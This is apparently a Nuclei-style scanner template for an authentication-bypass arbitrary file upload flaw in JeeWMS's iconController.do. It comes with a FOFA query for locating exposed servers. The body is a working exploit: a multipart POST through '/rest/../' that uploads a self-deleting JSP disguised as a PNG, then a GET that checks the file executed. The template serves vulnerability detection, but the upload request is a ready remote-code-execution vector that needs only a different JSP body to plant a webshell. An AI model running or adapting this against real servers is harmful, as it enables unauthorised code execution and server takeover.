id: JeeWMS-iconController_do-File-upload

info:
  name: JeeWMS iconController.do 接口任意文件上传漏洞
  author: Unknown
  severity: high
  description: |-
    fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
    JeeWMS iconController.do 接口存在任意文件上传安全缺陷，攻击者可绕过身份验证机制，通过构造恶意请求向服务器上传任意文件。该漏洞允许远程执行代码、植入后门程序，最终导致服务器权限被完全控制。
  reference:
  - https://mp.weixin.qq.com/s/yS5Oi1C3-XHKlG98sc1xIw
  tags: JeeWMS

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /rest/../iconController.do?saveOrUpdateIcon HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHRhkXyQjTSAk8j8c

    ------WebKitFormBoundaryHRhkXyQjTSAk8j8c
    Content-Disposition: form-data; name="name"; filename="{{username}}.jsp"
    Content-Type: image/png

    <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
    ------WebKitFormBoundaryHRhkXyQjTSAk8j8c--
- raw:
  - |
    GET /plug-in/accordion/images/{{username}}.jsp HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'pboyjnnrfipmplsukdeczudsefxmywe'
  - type: status
    status:
    - 200
